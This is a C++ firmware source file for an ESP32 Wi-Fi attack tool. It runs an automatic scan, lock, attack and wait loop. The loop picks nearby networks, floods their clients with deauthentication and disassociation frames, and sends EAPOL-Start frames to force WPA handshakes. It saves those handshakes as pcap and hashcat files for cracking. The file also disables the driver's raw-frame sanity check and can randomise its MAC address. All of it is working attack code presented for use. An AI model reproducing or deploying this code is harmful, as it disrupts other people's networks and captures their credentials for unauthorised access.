// 0N3P0rK sniffer - rewritten from scratch, M5PORKCHOP-style.
// Simple auto-attack state machine:
//   SCAN  -> hop channels, collect beacons
//   LOCK  -> lock on target channel, wait for clients
//   ATTACK-> deauth + capture EAPOL
//   WAIT  -> pause after handshake, then next target
// Captures ONLY what wpa-sec needs: beacon (SSID) + EAPOL M1-M4.
// Writes .pcap (radiotap) + .22000 (hashcat) to SD.

#include "sniffer.h"
#include "pcap.h"
#include "capture_name.h"
#include "hc22000.h"
#include "../storage/littlefs_ops.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include <WiFi.h>
#include <SD.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include <string.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
    return 0;
}

namespace Cap {

// ---------------- Constants ----------------
static const uint8_t HOP_ALL[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
static const uint8_t HOP_CORE[] = {1, 6, 11};
static const uint8_t RING_SLOTS = 16;
static const uint16_t FRAME_MAX = 1400;
static const uint16_t MAX_FILES = 200;
static const uint32_t MAX_FILE_SIZE = 8UL * 1024UL * 1024UL;
static const uint8_t MAX_NETWORKS = 16;
static const uint8_t MAX_CLIENTS = 20;

// State machine (M5PORKCHOP-style)
enum class AutoState : uint8_t {
    SCAN = 0,
    LOCK,
    ATTACK,
    WAIT,
    NEXT
};

// ---------------- Structures ----------------
struct NetInfo {
    uint8_t bssid[6];
    char ssid[33];
    int8_t rssi;
    uint8_t channel;
    bool pmf;
    bool hidden;
    uint8_t clients[MAX_CLIENTS][6];
    uint8_t clientN;
    uint32_t lastSeen;
    uint32_t lastData;
    uint32_t cooldownUntil;
    bool hasHs;
};

struct QueuedFrame {
    uint16_t len;
    uint32_t ts;
    int8_t rssi;
    uint8_t channel;
    uint8_t bssid[6];
    uint8_t frame[FRAME_MAX];
};

// ---------------- State ----------------
static QueuedFrame s_ring[RING_SLOTS];
static volatile uint8_t s_write = 0;
static volatile uint8_t s_read = 0;
static volatile bool s_running = false;
static RunMode s_mode = RunMode::Off;
static Counters s_count = {};

static NetInfo s_nets[MAX_NETWORKS];
static uint8_t s_netN = 0;

static AutoState s_state = AutoState::SCAN;
static uint32_t s_stateStart = 0;
static uint32_t s_lastHop = 0;
static uint8_t s_hopIdx = 0;
static uint8_t s_hopSet = 0;
static uint16_t s_hopMs = 300;

// Target
static int8_t s_targetIdx = -1;
static uint8_t s_targetBssid[6] = {};
static uint32_t s_attackStart = 0;
static uint32_t s_lastDeauth = 0;
static uint32_t s_lastKick = 0;
static uint8_t s_failedTargets = 0;

// Pinned target
static uint8_t s_pinBssid[6] = {};
static uint8_t s_pinChannel = 6;
static bool s_pinned = false;

// Skip list
static uint8_t s_skipList[8][6];
static uint8_t s_skipN = 0;

// File
static File s_file;
static uint8_t s_fileBssid[6] = {};
static uint32_t s_fileSize = 0;
static bool s_fileOpen = false;

// ---------------- Helpers ----------------
static bool sameMac(const uint8_t* a, const uint8_t* b) {
    return memcmp(a, b, 6) == 0;
}

static bool isZeroMac(const uint8_t* m) {
    for (uint8_t i = 0; i < 6; i++) if (m[i]) return false;
    return true;
}

static const uint8_t* hopTable(uint8_t& n) {
    if (s_hopSet == (uint8_t)HopSet::CORE) {
        n = sizeof(HOP_CORE);
        return HOP_CORE;
    }
    n = sizeof(HOP_ALL);
    return HOP_ALL;
}

static void setChannel(uint8_t ch) {
    if (ch < 1 || ch > 13) return;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    s_count.currentChannel = ch;
}

static void hopNext() {
    uint8_t n = 0;
    const uint8_t* hops = hopTable(n);
    s_hopIdx = (uint8_t)((s_hopIdx + 1) % n);
    setChannel(hops[s_hopIdx]);
    s_lastHop = millis();
}

// ---------------- Frame parsing ----------------
static bool isBeacon(const uint8_t* f, uint16_t len) {
    if (len < 24) return false;
    uint8_t type = f[0] & 0xfc;
    return type == 0x80 || type == 0x50; // beacon or probe-resp
}

static bool isEapolFrame(const uint8_t* f, uint16_t len, const uint8_t*& bssid) {
    if (!f || len < 32 || (f[0] & 0x0c) != 0x08) return false;
    const bool toDs = (f[1] & 0x01) != 0;
    const bool fromDs = (f[1] & 0x02) != 0;
    uint16_t off = 24;
    if (toDs && fromDs) {
        if (len < 34) return false;
        bssid = f + 16;
        off = 30;
    } else if (toDs) {
        bssid = f + 4;
    } else if (fromDs) {
        bssid = f + 10;
    } else {
        bssid = f + 16;
    }
    const uint8_t subtype = (f[0] >> 4) & 0x0f;
    if (subtype & 0x08) off += 2;
    if ((f[1] & 0x80) && off + 4 <= len) off += 4;
    return off + 8 <= len &&
           f[off] == 0xaa && f[off + 1] == 0xaa &&
           f[off + 2] == 0x03 && f[off + 6] == 0x88 &&
           f[off + 7] == 0x8e;
}

static void parseSsid(const uint8_t* f, uint16_t len, char out[33]) {
    out[0] = '\0';
    if (len < 36) return;
    uint16_t off = 36;
    while (off + 2 <= len) {
        uint8_t id = f[off];
        uint8_t l = f[off + 1];
        if (off + 2 + l > len) break;
        if (id == 0 && l > 0 && l <= 32) {
            memcpy(out, f + off + 2, l);
            out[l] = '\0';
            return;
        }
        off = (uint16_t)(off + 2 + l);
    }
}

static bool detectPmf(const uint8_t* f, uint16_t len) {
    if (len < 36) return false;
    uint16_t off = 36;
    while (off + 2 <= len) {
        uint8_t id = f[off];
        uint8_t l = f[off + 1];
        if (off + 2 + l > len) break;
        if (id == 48 && l >= 20) {
            uint16_t caps = (uint16_t)(f[off + 2 + 20] | (f[off + 2 + 21] << 8));
            return (caps & 0x0080) != 0;
        }
        off = (uint16_t)(off + 2 + l);
    }
    return false;
}

// ---------------- Network tracking ----------------
static NetInfo* findNet(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_netN; i++) {
        if (sameMac(s_nets[i].bssid, bssid)) return &s_nets[i];
    }
    return nullptr;
}

static NetInfo* addNet(const uint8_t* bssid, uint8_t ch, int8_t rssi) {
    NetInfo* n = findNet(bssid);
    if (n) {
        n->rssi = rssi;
        n->lastSeen = millis();
        return n;
    }
    if (s_netN < MAX_NETWORKS) {
        n = &s_nets[s_netN++];
    } else {
        // Evict oldest
        n = &s_nets[0];
        memmove(&s_nets[0], &s_nets[1], (MAX_NETWORKS - 1) * sizeof(NetInfo));
        s_netN = MAX_NETWORKS;
        n = &s_nets[MAX_NETWORKS - 1];
    }
    memset(n, 0, sizeof(NetInfo));
    memcpy(n->bssid, bssid, 6);
    n->channel = ch;
    n->rssi = rssi;
    n->lastSeen = millis();
    return n;
}

static void trackClient(const uint8_t* bssid, const uint8_t* clientMac) {
    if (isZeroMac(clientMac) || sameMac(clientMac, bssid)) return;
    NetInfo* n = findNet(bssid);
    if (!n) return;
    for (uint8_t i = 0; i < n->clientN; i++) {
        if (sameMac(n->clients[i], clientMac)) return;
    }
    if (n->clientN < MAX_CLIENTS) {
        memcpy(n->clients[n->clientN], clientMac, 6);
        n->clientN++;
    }
    n->lastData = millis();
}

static bool isSkippedBssid(const uint8_t* bssid) {
    for (uint8_t i = 0; i < s_skipN; i++) {
        if (sameMac(s_skipList[i], bssid)) return true;
    }
    return false;
}

static void addSkip(const uint8_t* bssid) {
    if (isSkippedBssid(bssid)) return;
    if (s_skipN < 8) {
        memcpy(s_skipList[s_skipN], bssid, 6);
        s_skipN++;
    }
}

// ---------------- PCAP writing ----------------
static void closeCapture() {
    if (!s_fileOpen) return;
    s_file.flush();
    s_file.close();
    s_fileOpen = false;
}

static bool openCapture(const uint8_t bssid[6]) {
    if (s_fileOpen && sameMac(s_fileBssid, bssid)) return true;
    closeCapture();
    if (Storage::stats().handshakes >= MAX_FILES) return false;

    char stem[Storage::FILE_NAME_MAX];
    CapName::buildStem("", bssid, stem, sizeof(stem));
    char path[96];
    snprintf(path, sizeof(path), "%s/%s.pcap", Storage::DIR_HANDSHAKES, stem);
    s_file = SD.open(path, "a");
    if (!s_file) return false;
    s_fileSize = s_file.size();
    if (s_fileSize == 0) {
        Pcap::FileHeader header{};
        header.magic = 0xA1B2C3D4;
        header.versionMajor = 2;
        header.versionMinor = 4;
        header.snaplen = 65535;
        header.linktype = 127;
        if (s_file.write((uint8_t*)&header, sizeof(header)) != sizeof(header)) {
            closeCapture();
            return false;
        }
        s_fileSize = sizeof(header);
        s_count.filesOpened++;
    }
    memcpy(s_fileBssid, bssid, 6);
    s_fileOpen = true;
    return true;
}

static void writeFrame(const QueuedFrame& q) {
    if (!openCapture(q.bssid) || s_fileSize >= MAX_FILE_SIZE) return;
    uint8_t rt[Pcap::RADIOTAP_FAT_LEN];
    const uint8_t rtLen = Pcap::buildRadiotap(rt, q.channel, q.rssi, true);
    Pcap::PacketHeader header{};
    header.tsSec = q.ts / 1000;
    header.tsUsec = (q.ts % 1000) * 1000;
    header.inclLen = rtLen + q.len;
    header.origLen = header.inclLen;
    if (s_file.write((uint8_t*)&header, sizeof(header)) != sizeof(header) ||
        s_file.write(rt, rtLen) != rtLen ||
        s_file.write(q.frame, q.len) != q.len) {
        s_count.framesDropped++;
        closeCapture();
        return;
    }
    s_fileSize += sizeof(header) + rtLen + q.len;
    s_count.framesWritten++;
}

// ---------------- Promiscuous callback ----------------
static void IRAM_ATTR promiscuousCallback(void* raw, wifi_promiscuous_pkt_type_t type) {
    if (!s_running || !raw) return;
    const wifi_promiscuous_pkt_t* pkt =
        reinterpret_cast<const wifi_promiscuous_pkt_t*>(raw);
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len > 4) len -= 4;
    if (len < 24) return;
    s_count.framesSeen++;

    const uint8_t* frame = pkt->payload;
    uint8_t bssid[6] = {};
    const uint8_t* eapolBssid = nullptr;

    // Beacon / probe-resp: track network
    if (isBeacon(frame, len)) {
        memcpy(bssid, frame + 16, 6);
        NetInfo* n = addNet(bssid, s_count.currentChannel, pkt->rx_ctrl.rssi);
        if (n) {
            parseSsid(frame, len, n->ssid);
            n->pmf = detectPmf(frame, len);
            if (n->ssid[0] == '\0') n->hidden = true;
        }
    }
    // EAPOL: capture for handshake
    else if (isEapolFrame(frame, len, eapolBssid)) {
        memcpy(bssid, eapolBssid, 6);
        s_count.framesEapol++;
        // Track client (addr2 = source)
        trackClient(bssid, frame + 10);
    }
    // Data frame: track client
    else if ((frame[0] & 0x0c) == 0x08) {
        memcpy(bssid, frame + 16, 6);
        trackClient(bssid, frame + 10);
    } else {
        return;
    }

    // Queue frame for PCAP + Hc22000
    const uint8_t next = (uint8_t)((s_write + 1) % RING_SLOTS);
    if (next == s_read) {
        s_count.framesDropped++;
        return;
    }
    QueuedFrame& q = s_ring[s_write];
    q.len = len > FRAME_MAX ? FRAME_MAX : len;
    if (len > FRAME_MAX) s_count.framesTruncated++;
    q.ts = millis();
    q.rssi = pkt->rx_ctrl.rssi;
    q.channel = s_count.currentChannel;
    memcpy(q.bssid, bssid, 6);
    memcpy(q.frame, frame, q.len);
    s_write = next;
    s_count.framesQueued++;
}

// ---------------- Deauth injection ----------------
static void sendDeauth(const uint8_t* bssid, const uint8_t* sta, uint8_t reason) {
    uint8_t f[26] = {};
    f[0] = 0xC0;
    memcpy(f + 4, sta, 6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    f[24] = reason;
    esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
    s_count.framesDeauth++;
}

static void sendDisassoc(const uint8_t* bssid, const uint8_t* sta, uint8_t reason) {
    uint8_t f[26] = {};
    f[0] = 0xA0;
    memcpy(f + 4, sta, 6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    f[24] = reason;
    esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false);
    s_count.framesDeauth++;
}

// ---------------- Target selection ----------------
static int8_t pickTarget() {
    int8_t best = -1;
    int8_t bestRssi = -128;
    uint32_t now = millis();
    for (uint8_t i = 0; i < s_netN; i++) {
        NetInfo& n = s_nets[i];
        if (n.rssi < Config::radio().minRssi) continue;
        if (isSkippedBssid(n.bssid)) continue;
        if (n.hasHs) continue;
        if (n.cooldownUntil > now) continue;
        if (n.rssi > bestRssi) {
            bestRssi = n.rssi;
            best = (int8_t)i;
        }
    }
    return best;
}

// ---------------- State machine ----------------
static void enterState(AutoState st) {
    s_state = st;
    s_stateStart = millis();
}

static void updateStateMachine() {
    uint32_t now = millis();
    RadioConfig& r = Config::radio();

    switch (s_state) {
        case AutoState::SCAN: {
            // Hop channels
            if (now - s_lastHop >= s_hopMs) hopNext();

            // After 5s of scanning, pick a target
            if (now - s_stateStart >= 5000) {
                int8_t t = pickTarget();
                if (t >= 0) {
                    s_targetIdx = t;
                    memcpy(s_targetBssid, s_nets[t].bssid, 6);
                    // Lock to target channel
                    setChannel(s_nets[t].channel);
                    enterState(AutoState::LOCK);
                    s_count.targetMode = 1; // LOCK
                    strncpy(s_count.targetSsid, s_nets[t].ssid,
                            sizeof(s_count.targetSsid) - 1);
                    s_count.targetSsid[sizeof(s_count.targetSsid) - 1] = '\0';
                    snprintf(s_count.targetBssid, sizeof(s_count.targetBssid),
                             "%02X:%02X:%02X:%02X:%02X:%02X",
                             s_targetBssid[0], s_targetBssid[1], s_targetBssid[2],
                             s_targetBssid[3], s_targetBssid[4], s_targetBssid[5]);
                } else {
                    // No target - keep scanning
                    s_failedTargets++;
                    if (s_failedTargets >= 3) {
                        s_failedTargets = 0;
                        // Clear cooldowns and retry
                        for (uint8_t i = 0; i < s_netN; i++) {
                            s_nets[i].cooldownUntil = 0;
                        }
                    }
                    enterState(AutoState::SCAN);
                }
            }
            break;
        }

        case AutoState::LOCK: {
            // Wait for clients (up to lockMs)
            NetInfo* n = findNet(s_targetBssid);
            if (!n) {
                enterState(AutoState::NEXT);
                break;
            }
            uint32_t lockMs = r.lockMs > 0 ? r.lockMs : 8000;
            bool hasClient = n->clientN > 0 || n->lastData > 0;
            if (hasClient || (now - s_stateStart) >= lockMs) {
                enterState(AutoState::ATTACK);
                s_attackStart = now;
                s_lastDeauth = 0;
                s_count.targetMode = 4; // KICK
            }
            break;
        }

        case AutoState::ATTACK: {
            NetInfo* n = findNet(s_targetBssid);
            if (!n) {
                enterState(AutoState::NEXT);
                break;
            }

            // Skip PMF - deauth won't work
            if (n->pmf) {
                n->cooldownUntil = now + 10000;
                enterState(AutoState::NEXT);
                break;
            }

            // Deauth burst every 180ms
            if (now - s_lastDeauth >= 180) {
                s_lastDeauth = now;
                uint8_t burst = r.kickBurst > 0 ? r.kickBurst : 2;

                // Targeted per-client deauth
                if (n->clientN > 0) {
                    for (uint8_t c = 0; c < n->clientN; c++) {
                        for (uint8_t b = 0; b < burst; b++) {
                            sendDeauth(n->bssid, n->clients[c], r.deauthReason);
                            if (r.jitterMs > 0) delay(esp_random() % (r.jitterMs + 1));
                        }
                        if (r.bidirKick) {
                            sendDisassoc(n->bssid, n->clients[c], 8);
                        }
                    }
                } else {
                    // Broadcast deauth
                    static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    for (uint8_t b = 0; b < burst; b++) {
                        sendDeauth(n->bssid, bcast, r.deauthReason);
                        if (r.jitterMs > 0) delay(esp_random() % (r.jitterMs + 1));
                    }
                }

                // EAPOL-Start to force re-auth
                if (r.eapolTx && n->clientN > 0) {
                    for (uint8_t c = 0; c < n->clientN; c++) {
                        WSLBypasser::sendEAPOLStart(n->bssid, n->clients[c]);
                    }
                }
            }

            // Pause deauth after M1
            if (Hc22000::shouldPauseDeauth()) {
                // Just wait - don't deauth while EAPOL is flowing
            }

            // Check for handshake
            if (Hc22000::hasPair(n->bssid)) {
                n->hasHs = true;
                s_count.targetMode = 2; // HS
                strncpy(s_count.lastHsSsid, n->ssid,
                        sizeof(s_count.lastHsSsid) - 1);
                s_count.lastHsSsid[sizeof(s_count.lastHsSsid) - 1] = '\0';
                enterState(AutoState::WAIT);
                break;
            }

            // Timeout - move on
            if (now - s_attackStart >= 15000) {
                n->cooldownUntil = now + (uint32_t)r.cooldownMs * 1000UL;
                enterState(AutoState::NEXT);
            }
            break;
        }

        case AutoState::WAIT: {
            // Wait 4.5s for late M3/M4, then next target
            if (now - s_stateStart >= 4500) {
                enterState(AutoState::NEXT);
            }
            break;
        }

        case AutoState::NEXT: {
            s_targetIdx = -1;
            s_count.targetMode = 0;
            s_count.targetSsid[0] = '\0';
            s_count.targetBssid[0] = '\0';
            enterState(AutoState::SCAN);
            break;
        }
    }
}

// ---------------- Public API ----------------
void begin() {
    Storage::begin();
    Storage::ensureDir(Storage::DIR_HANDSHAKES);
    Hc22000::reset();
    WSLBypasser::init();
    s_count = {};
    s_netN = 0;
    s_skipN = 0;
}

static void start(RunMode mode) {
    if (s_running) stop();
    s_mode = mode;
    s_running = true;
    s_write = s_read = 0;
    s_count = {};
    Hc22000::reset();
    s_netN = 0;
    s_skipN = 0;
    s_targetIdx = -1;
    s_failedTargets = 0;
    s_hopIdx = 0;
    s_hopSet = Config::radio().hopSet;
    s_hopMs = Config::radio().hopMs < 100 ? 100 : Config::radio().hopMs;

    // Randomize MAC if enabled
    if (Config::radio().randomMac) {
        WSLBypasser::randomizeMAC();
    }

    WiFi.mode(WIFI_AP_STA);
    WiFi.setSleep(false);
    uint8_t n = 0;
    const uint8_t* hops = hopTable(n);
    setChannel(hops[0]);
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
    esp_wifi_set_promiscuous(true);
    s_lastHop = millis();
    enterState(AutoState::SCAN);
}

void startLight() {
    s_pinned = false;
    start(RunMode::Light);
}

void startAggressive() {
    s_pinned = false;
    start(RunMode::Aggressive);
}

void startPinned(uint8_t ch, const uint8_t* bssid, const char*) {
    if (!bssid) return;
    memcpy(s_pinBssid, bssid, 6);
    s_pinChannel = (ch >= 1 && ch <= 13) ? ch : 6;
    s_pinned = true;
    start(RunMode::Pinned);
    setChannel(s_pinChannel);
    // Pinned mode: lock immediately
    NetInfo* n = addNet(bssid, s_pinChannel, -50);
    if (n) {
        s_targetIdx = (int8_t)(n - s_nets);
        memcpy(s_targetBssid, bssid, 6);
        enterState(AutoState::ATTACK);
        s_attackStart = millis();
        s_count.targetMode = 3; // PIN
    }
}

void stop() {
    if (!s_running && s_mode == RunMode::Off) return;
    s_running = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    while (s_read != s_write) {
        Hc22000::feed(s_ring[s_read].frame, s_ring[s_read].len);
        writeFrame(s_ring[s_read]);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    Hc22000::flushPending();
    closeCapture();
    s_mode = RunMode::Off;
    s_targetIdx = -1;
    s_count.targetMode = 0;
}

bool isRunning() { return s_running; }
RunMode runMode() { return s_mode; }
bool isLocked() { return s_state == AutoState::LOCK || s_state == AutoState::ATTACK; }
bool skipCurrent() {
    if (s_targetIdx < 0) return false;
    addSkip(s_targetBssid);
    s_targetIdx = -1;
    s_count.targetMode = 0;
    s_count.targetSsid[0] = '\0';
    s_count.targetBssid[0] = '\0';
    enterState(AutoState::SCAN);
    return true;
}
bool isSkipped(const uint8_t* bssid) { return isSkippedBssid(bssid); }
void setHsDepth(uint8_t depth) {
    if (depth > 2) depth = 2;
    Config::radio().hsDepth = depth;
    Config::save();
}
uint8_t hsDepth() { return Config::radio().hsDepth; }
const Counters& counters() { return s_count; }

void loop() {
    if (!s_running) return;

    // Drain ring: feed Hc22000 + write PCAP
    while (s_read != s_write) {
        Hc22000::feed(s_ring[s_read].frame, s_ring[s_read].len);
        writeFrame(s_ring[s_read]);
        s_read = (uint8_t)((s_read + 1) % RING_SLOTS);
    }
    Hc22000::flushPending();
    if (s_fileOpen) s_file.flush();

    // Light mode: just hop and capture, no attack
    if (s_mode == RunMode::Light) {
        if (millis() - s_lastHop >= s_hopMs) hopNext();
        return;
    }

    // Aggressive / Pinned: run state machine
    updateStateMachine();
}

} // namespace Cap